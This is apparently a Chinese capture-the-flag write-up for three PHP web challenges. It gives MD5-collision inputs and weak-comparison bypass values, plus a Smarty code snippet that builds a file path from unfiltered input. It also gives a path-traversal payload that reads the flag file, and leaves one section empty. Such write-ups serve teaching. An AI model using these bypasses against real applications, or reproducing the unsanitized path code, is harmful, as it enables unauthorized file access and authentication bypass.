### Writeup

[TOC]

#### 漏洞利用

##### bypass

利用PHP弱类型比较绕过，题目要求a和b不同而md5值相同，只需要找到符合这个条件的数据即可，使用GET传递

```
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

is_numeric函数会检查输入是否是数字或数字字符串，只需要插入字母即可绕过，并要求passwd==123456，在弱类型比较下，123456a==123456。num使用科学计数法绕过，只需要传递1e8就会被解析为100000000，使用POST传递

```
passwd=123456a&num=1e8
```

##### php-include



##### smarty

在主要代码中未对用户输入进行过滤，即使有路径拼接，但可以使用路径穿越漏洞访问其他目录。

```php
if (isset($_GET['page']) && gettype($_GET['page']) === 'string') {
    $file_path = "file://" . getcwd() . "/pages/" . $_GET['page'];
    $smarty->display($file_path);
}
```

只需要输入以下payload即可。

```
?page=../../../../../../../flag
```

